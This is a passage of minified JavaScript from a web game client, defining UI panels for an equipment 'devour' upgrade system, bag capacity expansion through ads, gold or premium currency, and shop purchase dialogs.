__extends(e,t),e.prototype.skinComplete=function(){this.viewStack.selectedIndex=e.LV_UP,this.proxy=h.TunTianEquipSystem.ins(),this.addChangeEvent(this.tab,this.onTabClick),this.addTouchEvent(this.help,this.onHelp),observe(this,this.updateTabRed,this.proxy.postInfo),observe(this,this.updateTabRed,o.RedPointBaseSys.ins().RpChange)},e.prototype.onHelp=function(t){var e;win.open("CommonHelpWin",(null===(e=s.GlobalConfig.HelpInfoConfig[351])||void 0===e?void 0:e.text)||"")},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.updateTabRed()},e.prototype.onTabClick=function(t){this.viewStack.selectedIndex=this.tab.selectedIndex},e.prototype.switchRole=function(){},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=r.OpenSystem.ins().checkSysOpen(a.SystemType.TunTian);return i||l.TipsCT.ins().showTips(r.OpenSystem.ins().getNoOpenTips(a.SystemType.TunTian)),i},e.prototype.updateTabRed=function(){this.tab.updateReds()},e.prototype.tabRp=function(){return h.TunTianEquipSystem.ins().rp.v},e.LV_UP=0,e.TUN_SI=1,e}(n.BaseView);e.TunTianEquipWin=u,window.TunTianEquipWin=u,__reflect(u.prototype,"TunTianEquipWin",[]),window.TunTianEquipWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TunTianLvPanel=void 0;var n=i(1),o=i(22),s=i(0),a=i(13),r=i(2),l=i(113),h=i(520),u=i(1336),p=i(521),d=i(1337),c=i(19),f=i(110),g=i(76),m=i(1338),v=function(t){function e(){var e=t.call(this)||this;return e._sn_="TunTianLvSkin",e.curRoleid=0,e.curPos=0,e.isMax=!1,e.proxy=l.TunTianEquipSystem.ins(),e}return __extends(e,t),e.prototype.skinComplete=function(){this.costCmlist.itemRenderer=f.CostComRender,this.costCmlist.dataProvider=this.costArr=new eui.ArrayCollection,this.limitList.itemRenderer=m.TunTianLimitItem,this.limitList.dataProvider=this.limitArr=new eui.ArrayCollection,this.tunsiBar.slideDuration=0,this.JubianBtn.eRp.visible=!1,this.tunsiBtn.eRp.visible=!1,this.suitBtn.eRp.visible=!1,this.proxy=l.TunTianEquipSystem.ins(),this.curEff=ObjectPool.pop("MovieClip"),this.eff.addChild(this.curEff),this.proxy=l.TunTianEquipSystem.ins(),this.posIconList=[this.pos0,this.pos1,this.pos2,this.pos3,this.pos4,this.pos5,this.pos6,this.pos7,this.pos8,this.pos9];for(var t=0;t<this.posIconList.length;t++)this.posIconList[t].selected=!1,this.addTouchEvent(this.posIconList[t],this.onPosClick);this.addTouchEvent(this.lvUpBtn,this.onClick),this.addTouchEvent(this.effClickGrp,this.onClick),this.addTouchEvent(this.useShow,this.onClick),this.addTouchEvent(this.JubianBtn,this.onClick),this.addTouchEvent(this.tunsiBtn,this.onClick),this.addTouchEvent(this.btnHelp,this.onClick),this.addTouchEvent(this.suitBtn,this.onClick),this.attrparam.itemRenderer=h.AttrNextVal,this.attrparam.dataProvider=new eui.ArrayCollection([]),this.updateView(this.curPos)},e.prototype.onJubainBack=function(t){this.updateView(t.pos)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(this.proxy.postInfo,this.updateView),this.observe(this.proxy.postActBack,this.onJubainBack),this.observe(this.proxy.postLvUpBack,this.updateView),this.observe(this.proxy.postJubianBack,this.onJubainBack),this.observe(this.proxy.postRedPoint,this.updateView),this.observe(this.proxy.postHuanHua,this.updateView),this.observe(this.proxy.postBossQuickFinish,this.updateView),this.updateView(this.curPos)},e.prototype.setRoleId=function(t){this.curRoleid=0;var e=this.proxy.info[this.curRoleid];e&&this.updateView(this.curPos)},e.prototype.onClick=function(t){var e,i=t.target;switch(i){case this.lvUpBtn:if(!this.curPosDat)return;var n=this.curPosDat.bayeLvOpen();if(n&&!n.isOpen)return void r.TipsCT.ins().showTips(gettext("开启条件：")+n.openTips);if(this.curPosDat.setCfg&&this.curPosDat.cost)for(var o=0,a=this.curPosDat.cost;o<a.length;o++){var l=a[o];if(!c.GlobalFun.checkCost(l.count,l.id))return}this.curPosDat.act?this.proxy.sendLvUp(this.curRoleid,this.curPosDat.pos):this.proxy.sendAct(this.curRoleid,this.curPosDat.pos);break;case this.effClickGrp:d.TunTianWepoenTips.openTunTian(this.curPosDat);break;case this.useShow:if(!this.curPosDat.act)return r.TipsCT.ins().showTips(gettext("激活后可幻化")),void(this.useShow.selected=!1);this.proxy.useShow(!this.useShow.selected,this.curRoleid,this.curPosDat.pos);break;case this.tunsiBtn:win.open(u.TunTianSkillTips);break;case this.suitBtn:p.TunTianSuitPanel.open2(this.curRoleid);break;case this.btnHelp:win.open(g.CommonHelpWin,(null===(e=s.GlobalConfig.HelpInfoConfig[353])||void 0===e?void 0:e.text)||"")}},e.prototype.updateView=function(t){this.curPos=t>-1?t:this.curPos;var e=a.SubRoles.ins().getSubRoleByIndex(this.curRoleid);if(e){var i=this.proxy.info[this.curRoleid];if(this.power.setPower(this.proxy.power[this.curRoleid]||0),i){this.curIcon&&(this.curIcon.selected=!1);var n=!0;for(var r in i){var l=this.posIconList[+r],h=i[r];h&&l&&(l.data=h,n&&(n=h.act),h.pos==this.curPos&&(this.curPosDat=h,this.curIcon=l,this.curIcon.selected=!0))}if(this.bgImg.source=n?"tunshi_bg05_png":"tunshi_bg01_png",this.curPosDat&&this.curPosDat.lvCfg){this.isMax=!1,this.useShow.enabled=this.useShow.visible=this.useShow.enabled=!1;var u=this.proxy.otherSystemParam(this.curPosDat.pos,this.curPosDat.lv),p=[];this.curEff.playFile(this.curPosDat.eff,-1);var d=[];if(this.curPosDat.setCfg&&this.curPosDat.cost)for(var c=0,f=this.curPosDat.cost;c<f.length;c++){var g=f[c];d.push({cost:{type:g.type,id:g.id,count:g.count},isShowXh:!1,isShowHas:!0})}if(this.costArr.replaceAll(d),0==this.curPosDat.act)this.lvUpBtn.label=gettext("激 活"),p=o.AttributeData.getAttrShowStrNoColor(this.curPosDat.lvCfg.attr,":",!1,0,!0).split("\n"),this.attrparam.dataProvider=new eui.ArrayCollection(p.concat(u));else{this.lvUpBtn.label=gettext("进 阶");var m=s.GlobalConfig.TunTianLevelUp[this.curPosDat.pos]&&s.GlobalConfig.TunTianLevelUp[this.curPosDat.pos][this.curPosDat.lv+1];m||(this.isMax=!0,this.lvUpBtn.label=gettext("满 阶"),this.lvUpBtn.enabled=!1),p=o.AttributeData.getAttrShowStrNoColor(this.curPosDat.lvCfg.attr,":",!1,0,!0).split("\n");var v=this.proxy.otherSystemParam(this.curPosDat.pos,this.curPosDat.lv+1,!0),y=[];if(this.isMax)y=u;else if(v.length>0)for(var C in v)y.push({curTxt:u[C],nextTxt:v[C]});this.attrparam.dataProvider=new eui.ArrayCollection(p.concat(y))}var T,b=this.curPosDat.bayeLvOpen();b&&(T=b.limitDataList),this.limitArr.source=T,this.limitGrp.visible=T&&T.length>0,this.tunsiBar.maximum=this.curPosDat.tunsiMax,this.tunsiBar.value=this.curPosDat.tuntianval||0,this.lvUpBtn.enabled=!0}}}},e.prototype.onPosClick=function(t){var e=t.currentTarget.data.pos;this.updateView(e)},e.prototype.tabRp=function(){return l.TunTianEquipSystem.ins().rp.v},e}(n.BaseView);e.TunTianLvPanel=v,window.TunTianLvPanel=v,__reflect(v.prototype,"TunTianLvPanel",[]),window.TunTianLvPanel=v},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TunTianSkillTips=void 0;var n=i(21),o=i(1),s=i(0),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="TunTianSkillTipsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.attr.textFlow=tHtml(s.GlobalConfig.TunTianBaseConf.skillTips1),this.attr0.textFlow=tHtml(s.GlobalConfig.TunTianBaseConf.skillTips2);var t=new n.MovieClip;t.playFile(RES_DIR_EFF+"tunshilianjie",-1),this.eff.addChild(t);var e=new n.MovieClip;this.eff.addChild(e),e.x=-110,e.y=-11;var i=RES_DIR_EFF+"tunshi_actived_0";e.playFile(i,-1)},e}(o.BaseView);e.TunTianSkillTips=a,window.TunTianSkillTips=a,__reflect(a.prototype,"TunTianSkillTips",[]),window.TunTianSkillTips=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TunTianWepoenTips=void 0;var n=i(21),o=i(1),s=i(22),a=i(10),r=i(326),l=i(113),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="TunTianWeaponTipsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(t,e,i,o,s,a){this.attr.textFlow=tHtml(o),this.attr0.textFlow=tHtml(s),this.bar.maximum=a.max,this.bar.value=a.val,this.move=new n.MovieClip,this.eff.addChild(this.move),this.move.playFile(e,-1),this.power.setPower(i),this.nameTxt.text=t,this.bar.slideDuration=0},e.openTunTian=function(t){if(t){var i=s.AttributeData.getAttrShowStrNoColor(t.lvCfg.attr,":",!1,0,!0),n=r.TunsiData.getTunSiAttrByVal(t.pos,t.tuntianval),o=s.AttributeData.getAttrShowStrNoColor(n,":",!1,0,!0),h=l.TunTianEquipSystem.ins().otherSystemParam(t.pos,t.lv);i=i+"\n"+h.join("\n");var u={val:t.tuntianval,max:t.tunsiMax},p=t.pos;switch(t.pos){case 5:p=4;break;case 6:p=5;break;case 7:p=6;break;case 8:p=6;break;case 9:p=7}var d=RES_DIR_EFF+"tunshi_actived_"+p,c=t.act?a.ItemUtil.getAttrPower(t.lvCfg.attr)+a.ItemUtil.getAttrPower(n):0;win.open(e,t.setCfg.name,d,c,i,o,u)}},e}(o.BaseView);e.TunTianWepoenTips=h,window.TunTianWepoenTips=h,__reflect(h.prototype,"TunTianWepoenTips",[]),window.TunTianWepoenTips=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TunTianLimitItem=void 0;var n=i(5),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){(this.data||!this.skin)&&(this.icon.source=this.data.icon,this.nameTxt.textFlow=n.TextFlowMaker.generateTextFlow1(this.data.name))},e}(eui.ItemRenderer);e.TunTianLimitItem=o,window.TunTianLimitItem=o,__reflect(o.prototype,"TunTianLimitItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TunTianSetIcon=void 0;var n=i(21),o=i(18),s=i(49),a=i(113),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="TunTianSetIconSkin",e.angle=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){var t;if(this.skin){if(this.nameTxt&&!this.data)return this.nameTxt.text="",this.redPoint.visible=!1,void(this.eff&&removeFromParent(this.eff));if(this.data&&this.redPoint){var e=this.data,i=e.pos,r=e.name,l=e.lv,h=e.act,u=(e.icon,e.eff);this.redPoint.visible=(null===(t=a.TunTianEquipSystem.ins().lvUpRp[i])||void 0===t?void 0:t.v)||!1,this.seletImg.visible=this.selected,this.nameTxt.textFlow=tHtml(r+("<font color="+o.ColorUtil.ROLENAME_COLOR_YELLOW+">"+l+"</font>")),h?this.effGroup.filters=[]:this.effGroup.filters=s.FilterUtil.ARRAY_GRAY_FILTER,this.eff||(this.eff=new n.MovieClip,this.eff.scaleX=.3,this.eff.scaleY=.3,this.addChild(this.eff),window.tteff=this.eff,this.effGroup.addChild(this.eff)),this.eff.playFile(u,-1)}}},e.prototype.getData=function(){return this.data},e.prototype.invalidateState=function(){t.prototype.invalidateState.call(this),this.seletImg&&(this.seletImg.visible=this.selected)},e}(eui.ItemRenderer);e.TunTianSetIcon=r,window.TunTianSetIcon=r,__reflect(r.prototype,"TunTianSetIcon",[]),window.TunTianSetIcon=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TunTianTunsiPanel=void 0;var n=i(21),o=i(18),s=i(8),a=i(19),r=i(1),l=i(0),h=i(36),u=i(7),p=i(27),d=i(113),c=i(520),f=i(1341),g=function(t){function e(){var e=t.call(this)||this;return e._sn_="TunTianTunsiSkin",e.curIndex=0,e.doubleMoney=0,e.proxy=d.TunTianEquipSystem.ins(),e}return __extends(e,t),e.prototype.skinComplete=function(){this.attrparam.itemRenderer=c.AttrNextVal,this.addTouchEvent(this.okBtn,this.onClick),this.addTouchEvent(this.doubleBtn,this.onClick),this.addTouchEvent(this.singleBtn,this.onClick),this.addTouchEvent(this.help,this.onClick),this.addTouchEvent(this.noneBoss,this.onClick),this.bgEff=this.bgEff||ObjectPool.pop("MovieClip"),this.bgEff.playFile(RES_DIR_EFF+"tunshi_bg_eff",-1),this.bgEff.y=5,this.targetEff.addChild(this.bgEff),this.tEff=this.tEff||ObjectPool.pop("MovieClip"),this.targetEff.addChild(this.tEff),this.linkEff=this.linkEff||new n.MovieClip,this.linkEff.x=110},e.prototype.onInfo=function(){this.initView()},e.prototype.addDisplay=function(t){this.observe(this.proxy.postTunsiInfo,this.onInfo),this.observe(this.proxy.postBossQuickFinish,this.onInfo),this.initView()},e.prototype.initView=function(){if(this.bossList.itemRenderer=f.TunsiBossIcon,this.getGroup.visible=!1,this.targetBoss.setBgShow(!1),this.proxy.tunsiInfo.length>0)this.lastTimeTxt.visible=!0,this.seletBoss(0),this.bossList.selectedIndex=0,this.noneBoss.visible=!1,this.bossList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onBossListClick,this),this.okBtn.enabled=!0;else{this.tEff&&this.tEff.parent&&this.targetEff.removeChild(this.tEff),this.tEff&&this.tEff.stop(),this.linkEff&&this.linkEff.parent&&this.targetEff.removeChild(this.linkEff),this.linkEff&&this.linkEff.stop(),this.targetBoss.data=null,this.bossList.dataProvider=new eui.ArrayCollection([]),this.lastTimeTxt.text="";var t=[gettext("吞噬装备：<font color='{0}'>暂无</font>",o.ColorUtil.RED),gettext("吞噬值：")+("<font color='"+o.ColorUtil.ROLENAME_COLOR_YELLOW+"'>0</font>\n")];this.attrparam.dataProvider=new eui.ArrayCollection(t),this.valBar.maximum=0,this.valBar.value=0,this.okBtn.enabled=!1,this.noneBoss.visible=!0,this.targetBoss.data=null
}},e.prototype.onClick=function(t){var e=this,i=t.target;switch(i){case this.okBtn:if(!this.curData.timeOver()){var n=this.curData.endtime-u.GameServerCC.serverTime;0>n&&(n=0),n=Math.ceil(n/1e3/60);var s=Math.ceil(l.GlobalConfig.TunTianBaseConf.nowFinish*n);a.GlobalFun.checkCost(s,h.MoneyConst.yuanbao)&&p.WarnWin.show(gettext("是否消耗|C:{1}&T:{0}元宝|，立即完成吞噬？",s,o.ColorUtil.WHITE_COLOR2),function(){e.proxy.sendTunsi(1)},this)}break;case this.singleBtn:this.proxy.sendTunsi(2);break;case this.doubleBtn:if(this.curData.cfg&&this.curData.cfg.phagocytize&&this.curData.cfg.phagocytize.doubleUse){var r=this.curData.cfg.phagocytize.doubleUse;a.GlobalFun.checkCost(r,h.MoneyConst.yuanbao)&&p.WarnWin.show(gettext("是否消耗|C:{1}&T:{0}元宝|，领取双倍吞噬值？",r,o.ColorUtil.WHITE_COLOR2),function(){e.proxy.sendTunsi(3)},this)}}},e.prototype.seletBoss=function(t){if(this.proxy.tunsiInfo[t]){this.bottom1.visible=!0,this.bottom1.visible=0==t;var e=this.curData=this.proxy.tunsiInfo[t];this.curIndex=t,this.okBtn.visible=!0;var i=[gettext("吞噬装备：<font color='{0}'>{1}</font>",o.ColorUtil.RED,this.curData.wepoenname),gettext("吞噬值：")+("<font color='"+o.ColorUtil.ROLENAME_COLOR_YELLOW+"'>"+this.curData.addval+"</font>")];this.attrparam.dataProvider=new eui.ArrayCollection(i.concat(this.curData.attrStr)),this.bossList.dataProvider=new eui.ArrayCollection(this.proxy.tunsiInfo),this.downTime(),Timer.start(500,0,this.downTime,this),0==this.curIndex&&(this.okBtn.label=gettext("立即完成")),0==this.curData.endtime?(this.lastTimeTxt.text=gettext("未开吞噬"),this.getGroup.visible=!1):this.curData.timeOver()&&(this.getGroup.visible=!0),this.targetBoss.data=this.curData,this.curData.cfg&&this.curData.cfg.phagocytize&&this.curData.cfg.phagocytize.doubleUse&&(this.doubleTxt.visible=this.doubleBtn.visible=!0,this.doubleTxt.text=this.curData.cfg.phagocytize.doubleUse);var n=this.proxy.tunsiInfo[this.curIndex]&&this.proxy.info[this.curData.role][e.pos];if(n&&n.lvCfg){var s=n.eff;this.tEff.playFile(s,-1),this.valBar.visible=!0,this.valBar.maximum=n.lvCfg.tunshiNum,this.valBar.value=n.tuntianval,this.targetEff.addChild(this.tEff),this.moveTEff(0,20),this.linkEff.playFile(RES_DIR_EFF+"tunshilianjie",-1),this.targetEff.addChild(this.linkEff),window.linkEff=this.linkEff}}},e.prototype.moveTEff=function(t,e){var i=this,n=this.tEff.y>t?t:e;this.tTween=egret.Tween.get(this.tEff,{loop:!1},null,!0).to({y:n},2e3).call(function(){i.moveTEff(t,e)},this)},e.prototype.downTime=function(){if(this.curData){if(this.curData.timeOver())return Timer.stopAll(this),this.okBtn.visible=!1,this.bottom1.visible=!1,this.lastTimeTxt.visible=!1,void(this.getGroup.visible=!0);if(0==this.curData.endtime)return void(this.lastTimeTxt.textFlow=tHtml(gettext("<font color='{0}'>未开始</font>",o.ColorUtil.RED)));var t=this.curData.endtime-u.GameServerCC.serverTime,e=gettext("吞噬剩余时间：<font color='{0}'>{1}</font>",o.ColorUtil.ROLENAME_COLOR_YELLOW,s.DateUtils.getFormatBySecond(t/1e3,s.DateUtils.TIME_FORMAT_1));this.lastTimeTxt.textFlow=tHtml(e)}},e.prototype.onBossListClick=function(t){t&&t.item&&this.seletBoss(this.proxy.tunsiInfo.indexOf(t.item))},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];console.trace("close")},e}(r.BaseView);e.TunTianTunsiPanel=g,window.TunTianTunsiPanel=g,__reflect(g.prototype,"TunTianTunsiPanel",[]),window.TunTianTunsiPanel=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TunsiBossIcon=void 0;var n=function(t){function e(){var e=t.call(this)||this;return e._sn_="TunsiBossIconSkin",e.bolShowBg=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(!this.data&&this.nameTxt)return this.nameTxt.text="",this.icon.source="",this.tunsi.text="",void(this.bgkuang.visible=!1);if(this.data&&this.nameTxt){var t=this.data;if(t.cfg){var e=t.cfg.phagocytize&&(t.cfg.phagocytize.min||0),i=t.cfg.phagocytize&&(t.cfg.phagocytize.max||0);this.tunsi.text=gettext("吞噬值：{0}",e+"-"+i),this.nameTxt.text=t.cfg.name,this.icon.source=t.icon,this.invalidateState(),this.bgkuang.visible=this.bolShowBg}}},e.prototype.invalidateState=function(){t.prototype.invalidateState.call(this),this.seletImg&&(this.seletImg.visible=this.selected)},e.prototype.setBgShow=function(t){this.bolShowBg=t,this.skin&&(this.bgkuang.visible=this.bolShowBg)},e}(eui.ItemRenderer);e.TunsiBossIcon=n,window.TunsiBossIcon=n,__reflect(n.prototype,"TunsiBossIcon",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BagAddCellWin=void 0;var n=i(8),o=i(90),s=i(19),a=i(61),r=i(66),l=i(1),h=i(0),u=i(124),p=i(36),d=i(30),c=i(6),f=i(23),g=i(25),m=i(7),v=i(85),y=i(2),C=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="BagAddCellSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.closeBtn,this.onClose),this.addTouchEvent(this.btnPay,this.onClick),this.addTouchEvent(this.btnAd,this.onClick),this.addTouchEvent(this.btnGold,this.onClick),observe(this,this.updateView,c.BagCT.ins().postBagCellAdd),this.grp0.visible=platform.getAdType()>0},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=h.GlobalConfig.BagBaseConfig,n=h.GlobalConfig.RechargeConfig[i.rechargeEx.rid],o=n.cash/g.Recharge.YB_TO_PAY;this.isYbEX()?this.lbPay.text=gettext("{0}元宝",i.ybEx.cost):this.lbPay.text=r.PayUtils.getPayUnitStr(o,urlParam.payUnit),this.updateView()},e.prototype.removeDisplay=function(){Timer.stop(this.updateCountDown,this)},e.prototype.updateView=function(){var t=h.GlobalConfig.BagBaseConfig;if(2==platform.getAdType()){var e=a.LocationProperty.IOS_NO_AD_TIME-(m.GameServerCC.serverTime-n.DateUtils.formatMiniDateTime(v.Setting.ins().getValue(v.ClientSet.ADD_BAG_TIME)));this.btnAd.enabled=0>=e,this.updateCountDown(),e>0&&!Timer.has(this.updateCountDown,this)&&Timer.start(1e3,-1,this.updateCountDown,this)}else 1==platform.getAdType()?this.lbAd.text=gettext("看广告({0}次)",c.BagCT.ins().todayAdLastTime):3==platform.getAdType()&&(this.btnAd.enabled=!0,this.lbAd.text=gettext("免费领取"),Timer.stop(this.updateCountDown,this));var i=t.adEx;this.lbAd0.text=gettext("已扩展({0}/{1})",(i.max-c.BagCT.ins().adLastTime)*i.add,i.max*i.add);var o=t.goldEx;if(this.lbGold.text=""+t.goldEx.cost*(o.max-c.BagCT.ins().goldLastTime+1),this.lbAd1.text=gettext("已扩展({0}/{1})",(o.max-c.BagCT.ins().goldLastTime)*o.add,o.max*o.add),this.isYbEX()){var s=t.ybEx;this.lbPay0.text=gettext("已扩展({0}/{1})",(s.max-c.BagCT.ins().YuanBaoTimes)*s.add,s.max*s.add)}else s=t.rechargeEx,this.lbPay0.text=gettext("已扩展({0}/{1})",(s.max-c.BagCT.ins().payLastTime)*s.add,s.max*s.add)},e.prototype.isYbEX=function(){var t=h.GlobalConfig.BagBaseConfig,e=urlParam.apptype;for(var i in t.ybExAppType)if(e==t.ybExAppType[i])return!0;return!1},e.prototype.onClose=function(){win.close(this)},e.prototype.onClick=function(t){var e=this;switch(t.currentTarget){case this.btnAd:if(c.BagCT.ins().adLastTime>0&&c.BagCT.ins().todayAdLastTime>0)if(2==platform.getAdType()&&(f.GameLogic.ins().sendAdReward(d.AD_REWARDTYPE.BAG),v.Setting.ins().setValue(v.ClientSet.ADD_BAG_TIME,n.DateUtils.formatServerTime(m.GameServerCC.serverTime)),c.BagCT.ins().sendBagCellAdd(1)),3==platform.getAdType())f.GameLogic.ins().sendAdReward(d.AD_REWARDTYPE.BAG),c.BagCT.ins().sendBagCellAdd(1);else{if(g.Recharge.ins().isGotAdPrivilege||o.DeviceUtils.IsPC)return f.GameLogic.ins().sendAdReward(d.AD_REWARDTYPE.BAG),void c.BagCT.ins().sendBagCellAdd(1);window.platform.showAd(function(){f.GameLogic.ins().sendAdReward(d.AD_REWARDTYPE.BAG),c.BagCT.ins().sendBagCellAdd(1),win.close(e)},u.AdType.BagExpand)}else y.TipsCT.ins().showTips(gettext("容量扩展已达上限"));break;case this.btnGold:if(c.BagCT.ins().goldLastTime>0){var i=h.GlobalConfig.BagBaseConfig.goldEx.cost*(h.GlobalConfig.BagBaseConfig.goldEx.max-c.BagCT.ins().goldLastTime+1);s.GlobalFun.checkCost(i,p.MoneyConst.gold)&&c.BagCT.ins().sendBagCellAdd(2)}else y.TipsCT.ins().showTips(gettext("容量扩展已达上限"));break;case this.btnPay:if(this.isYbEX())if(c.BagCT.ins().YuanBaoTimes>0){var a=h.GlobalConfig.BagBaseConfig,i=a.ybEx.cost;s.GlobalFun.checkCost(i,p.MoneyConst.yuanbao)&&c.BagCT.ins().sendBagCellAdd(3)}else y.TipsCT.ins().showTips(gettext("容量扩展已达上限"));else if(c.BagCT.ins().payLastTime>0){var a=h.GlobalConfig.BagBaseConfig,r=a.rechargeEx.rid;g.Recharge.ins().sendPayOrder(r),win.close(this)}else y.TipsCT.ins().showTips(gettext("容量扩展已达上限"))}},e.prototype.updateCountDown=function(){var t=a.LocationProperty.IOS_NO_AD_TIME-(m.GameServerCC.serverTime-n.DateUtils.formatMiniDateTime(v.Setting.ins().getValue(v.ClientSet.ADD_BAG_TIME)));t>0?this.lbAd.text=n.DateUtils.getFormatBySecond(.001*t,n.DateUtils.TIME_FORMAT_3):(this.lbAd.text=gettext("免费领取"),this.btnAd.enabled=!0,Timer.stop(this.updateCountDown,this))},e}(l.BaseView);e.BagAddCellWin=C,window.BagAddCellWin=C,__reflect(C.prototype,"BagAddCellWin",[]),window.BagAddCellWin=C},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BagAddItemWarn=void 0;var n=i(24),o=i(1),s=i(0),a=i(36),r=i(4),l=i(6),h=i(2),u=function(t){function e(){var e=t.call(this)||this;return e._sn_="OpenCellSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.price.setType(a.MoneyConst.yuanbao)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.decBtn,this.onTap),this.addTouchEvent(this.addBtn,this.onTap),this.addTouchEvent(this.sureBtn,this.onTap),this.addTouchEvent(this.cancelBtn,this.onTap),this.addTouchEvent(this.closeBtn,this.onTap),this.addTouchEvent(this.bgClose,this.onTap),this.setCount(5)},e.prototype.onTap=function(t){switch(t.currentTarget){case this.decBtn:this.setCount(Number(this.count.text)-5);break;case this.addBtn:this.setCount(Number(this.count.text)+5);break;case this.sureBtn:if(!(r.ActorCC.yb>=this.price.getPrice())){h.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:元宝不足|")),win.close(this);break}l.BagCT.ins().sendAddBagGrid(Number(this.count.text)/5);case this.cancelBtn:case this.closeBtn:win.close("BagAddItemWarn");break;case this.bgClose:win.close("BagAddItemWarn")}},e.prototype.setCount=function(t){var e=s.GlobalConfig.BagBaseConfig,i=s.GlobalConfig.BagExpandConfig,o=n.CommonUtils.getObjectLength(i),a=(r.ActorCC.bagNum-e.baseSize)/e.rowSize,l=(o-a)*e.rowSize;5>t?(t=5,h.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:已经是最小扩张数|"))):t>l&&(t=l,h.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:已经是最大扩张数|"))),this.count.text=""+t;for(var u=0,p=t/e.rowSize,d=1;p>=d;d++)u+=i[a+d].cost;this.price.setPrice(u)},e}(o.BaseView);e.BagAddItemWarn=u,window.BagAddItemWarn=u,__reflect(u.prototype,"BagAddItemWarn",[]),window.BagAddItemWarn=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShopGoodsWarn=void 0;var n=i(24),o=i(1),s=i(0),a=i(36),r=i(23),l=i(25),h=i(52),u=i(2),p=i(231),d=i(19),c=i(6),f=i(63),g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GainGoodsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.gainList.itemRenderer=p.GainGoodsItem,this.gainList.dataProvider=this.arc=new eui.ArrayCollection,this.countTxt.restrict="0-9",this.price.setType(a.MoneyConst.yuanbao),this.totalPrice.setType(a.MoneyConst.yuanbao),this.dataArr&&this.setData(this.dataArr.id,this.dataArr.num)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];"7000183"==urlParam.appid&&window.mz?(this.chatGroup.touchChildren=!1,this.chatGroup.touchEnabled=!0):(this.chatGroup.touchChildren=!0,this.chatGroup.touchEnabled=!1),this.addTouchEvent(this.decBtn,this.onTap),this.addTouchEvent(this.addBtn,this.onTap),this.addTouchEvent(this.dec10Btn,this.onTap),this.addTouchEvent(this.add10Btn,this.onTap),this.addTouchEvent(this.buyBtn,this.onTap),this.addTouchEvent(this.topUpBtn,this.onTap),this.addTouchEvent(this.chatGroup,this.onTap),this.gainList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onTouchList,this),this.addChangeEvent(this.countTxt,this.onTxtChange),observe(this,this.buyCallBack,h.Shop.ins().postBuyResult),observe(this,this.updateInputText,r.GameLogic.ins().postInputText),this.countTxt.addEventListener(egret.FocusEvent.FOCUS_IN,this.textInOn,this)},e.prototype.updateInputText=function(t){this.countTxt.text=t,this.textInOn()},e.prototype.textInOn=function(){this.countTxt.text==gettext("请输入")&&(this.countTxt.text="")},e.prototype.onTap=function(t){switch(t.currentTarget){case this.decBtn:this.setTotalPrice(this._totalNum-1);break;case this.addBtn:this.setTotalPrice(this._totalNum+1);break;case this.dec10Btn:this.setTotalPrice(this._totalNum-10);break;case this.add10Btn:this.setTotalPrice(this._totalNum+10);break;case this.buyBtn:if(c.BagCT.ins().getAllSurplusCount(1)<0)return void u.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));if("7000183"==urlParam.appid&&window.mz&&!parseInt(this.countTxt.text))return void u.TipsCT.ins().showTips(gettext("请输入数字"));d.GlobalFun.checkCost(this.totalPrice.getPrice(),this.totalPrice.getType())?h.Shop.ins().sendBuy(1,[[this._goodsId,this._totalNum]]):win.close(this);break;case this.topUpBtn:d.GlobalFun.openRechargeWin(),win.close("ShopGoodsWarn");break;case this.chatGroup:"7000183"==urlParam.appid&&window.mz&&n.CommonUtils.getKeyboard(0,this.countTxt.text||"")}},e.prototype.onTouchList=function(t){var e=t.item;null!=t.item&&(f.WarnCT.ins().handleItemWayTouch(e),win.close(this))},e.prototype.onTouchList2=function(t){var e=t.item;if(null!=t.item){var i=win.openCheck(e[1],[e[2]]);if(i){var n=!0;if("Recharge2Win"==e[1]){var 